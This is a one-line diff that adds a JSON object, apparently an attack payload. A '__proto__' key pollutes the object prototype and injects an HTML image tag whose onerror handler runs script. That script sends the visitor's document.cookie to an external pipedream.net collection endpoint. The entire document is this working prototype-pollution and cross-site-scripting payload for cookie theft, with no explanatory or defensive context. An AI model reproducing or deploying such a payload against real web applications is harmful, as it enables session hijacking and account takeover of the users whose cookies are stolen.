@@ -1,0 +1,1 @@
+{   "color": "yellow",   "__proto__": {     "win": "<img src=x onerror='const s = document.createElement(\"script\"); s.innerHTML = \"fetch(\\\"https://eomlp3rvjuni0t9.m.pipedream.net/?data=\\\" + encodeURIComponent(document.cookie));\"; document.body.appendChild(s);'>"   } }
